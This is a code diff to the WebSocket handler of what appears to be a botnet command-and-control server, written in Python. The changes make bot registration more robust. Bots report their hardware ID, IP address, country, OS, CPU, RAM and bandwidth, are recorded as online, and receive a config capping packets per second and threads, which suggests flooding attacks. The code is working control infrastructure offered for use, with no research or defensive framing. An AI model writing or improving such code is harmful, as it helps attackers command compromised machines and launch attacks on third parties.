@@ -170,28 +170,22 @@ async def handle_bot_websocket(ws: WebSocket, bot_id: str):
     print(f"[WS] bot {bot_id} connected, sending ack")
 
     try:
-        await ws.send_json({
-            "type": "connected",
-            "bot_id": bot_id,
-            "message": "WebSocket open. Send handshake JSON or wait for bot protocol.",
-            "expect": {
-                "type": "handshake",
-                "bot_id": bot_id,
-                "bot_identifier": "optional-hwid",
-            },
-        })
+        # Flat JSON only — nested "type" broke naive bot parsers
+        await ws.send_json({"type": "connected", "bot_id": bot_id})
         print(f"[WS] connected frame sent to {bot_id}, waiting for handshake")
-    except Exception:
+    except Exception as e:
+        print(f"[WS] send connected failed {bot_id}: {e}")
         await manager.disconnect(session_key, ws)
         return
 
     try:
         while True:
             raw = await ws.receive_text()
-            print(f"[WS] bot {session_key} recv {len(raw)} bytes")
+            print(f"[WS] bot {session_key} recv {len(raw)} bytes: {raw[:200]}")
             try:
                 data = json.loads(raw)
             except json.JSONDecodeError:
+                print(f"[WS] invalid JSON from {session_key}: {raw[:120]}")
                 try:
                     await ws.send_json({"type": "error", "message": "Invalid JSON"})
                 except Exception:
@@ -205,69 +199,75 @@ async def handle_bot_websocket(ws: WebSocket, bot_id: str):
 
             if msg_type == "handshake":
                 print(f"[WS] bot {session_key} handshake received")
-                identifier = data.get("bot_identifier") or data.get("bot_id") or bot_id
-                handshake_bot_id = data.get("bot_id", bot_id)
-                uid = _try_uuid(handshake_bot_id) or _try_uuid(bot_id)
-                if not uid:
-                    await ws.send_json({"type": "error", "message": "Invalid bot_id (must be UUID)"})
+                try:
+                    identifier = data.get("bot_identifier") or data.get("bot_id") or bot_id
+                    handshake_bot_id = data.get("bot_id", bot_id)
+                    uid = _try_uuid(str(handshake_bot_id)) or _try_uuid(str(bot_id))
+                    if not uid:
+                        await ws.send_json({"type": "error", "message": "Invalid bot_id (must be UUID)"})
+                        continue
+
+                    async with async_session() as s:
+                        bot = (await s.execute(
+                            select(Bot).where(Bot.bot_identifier == str(identifier))
+                        )).scalar_one_or_none()
+
+                        if not bot:
+                            bot = (await s.execute(select(Bot).where(Bot.id == uid))).scalar_one_or_none()
+
+                        if not bot:
+                            nb = Bot(
+                                id=uid,
+                                bot_identifier=str(identifier)[:128],
+                                ip_address=data.get("ip_address") or None,
+                                country=data.get("country"),
+                                os_name=(data.get("os_name") or data.get("os_version") or "Linux")[:64],
+                                cpu_cores=data.get("cpu_cores") or 1,
+                                ram_total_mb=data.get("ram_total_mb") or 0,
+                                net_speed_mbps=data.get("net_speed_mbps") or 0,
+                                status="online",
+                                first_seen_at=datetime.now(timezone.utc),
+                                last_heartbeat_at=datetime.now(timezone.utc),
+                                bot_version=(data.get("version") or "")[:32],
+                            )
+                            s.add(nb)
+                            await s.commit()
+                            db_id = str(uid)
+                        else:
+                            db_id = str(bot.id)
+                            if data.get("ip_address"):
+                                bot.ip_address = data.get("ip_address")
+                            bot.status = "online"
+                            bot.last_heartbeat_at = datetime.now(timezone.utc)
+                            if data.get("cpu_cores"):
+                                bot.cpu_cores = data.get("cpu_cores")
+                            if data.get("ram_total_mb"):
+                                bot.ram_total_mb = data.get("ram_total_mb")
+                            if data.get("os_name"):
+                                bot.os_name = data.get("os_name")
+                            elif data.get("os_version"):
+                                bot.os_name = data.get("os_version")
+                            if data.get("version"):
+                                bot.bot_version = data.get("version")
+                            await s.commit()
+
+                    await manager.rebind(session_key, db_id, ws)
+                    session_key = db_id
+                    await ws.send_json({
+                        "type": "handshake_ack",
+                        "bot_id": db_id,
+                        "config": {"max_pps": 100000, "max_threads": 100},
+                    })
+                    print(f"[WS] handshake_ack sent session={session_key}")
+                except Exception as e:
+                    print(f"[WS] handshake error {session_key}: {e}")
+                    import traceback
+                    traceback.print_exc()
+                    try:
+                        await ws.send_json({"type": "error", "message": f"handshake failed: {e}"})
+                    except Exception:
+                        pass
                     continue
-
-                async with async_session() as s:
-                    bot = (await s.execute(
-                        select(Bot).where(Bot.bot_identifier == identifier)
-                    )).scalar_one_or_none()
-
-                    if not bot:
-                        # Also try by primary key in case of reconnect with same UUID
-                        bot = (await s.execute(select(Bot).where(Bot.id == uid))).scalar_one_or_none()
-
-                    if not bot:
-                        nb = Bot(
-                            id=uid,
-                            bot_identifier=identifier,
-                            ip_address=data.get("ip_address") or None,
-                            country=data.get("country"),
-                            os_name=data.get("os_name") or data.get("os_version") or "Linux",
-                            cpu_cores=data.get("cpu_cores"),
-                            ram_total_mb=data.get("ram_total_mb"),
-                            net_speed_mbps=data.get("net_speed_mbps"),
-                            status="online",
-                            first_seen_at=datetime.now(timezone.utc),
-                            last_heartbeat_at=datetime.now(timezone.utc),
-                            bot_version=data.get("version"),
-                        )
-                        s.add(nb)
-                        await s.commit()
-                        db_id = str(uid)
-                    else:
-                        # Keep DB id as canonical; rebind WS key to it
-                        db_id = str(bot.id)
-                        if data.get("ip_address"):
-                            bot.ip_address = data.get("ip_address")
-                        bot.status = "online"
-                        bot.last_heartbeat_at = datetime.now(timezone.utc)
-                        if data.get("cpu_cores"):
-                            bot.cpu_cores = data.get("cpu_cores")
-                        if data.get("ram_total_mb"):
-                            bot.ram_total_mb = data.get("ram_total_mb")
-                        if data.get("os_name"):
-                            bot.os_name = data.get("os_name")
-                        elif data.get("os_version"):
-                            bot.os_name = data.get("os_version")
-                        if data.get("version"):
-                            bot.bot_version = data.get("version")
-                        await s.commit()
-
-                await manager.rebind(session_key, db_id, ws)
-                session_key = db_id
-                await ws.send_json({
-                    "type": "handshake_ack",
-                    "bot_id": db_id,
-                    "config": {
-                        "max_pps": 100000,
-                        "max_threads": 100,
-                    },
-                })
 
             elif msg_type == "heartbeat":
                 uid = _try_uuid(session_key)
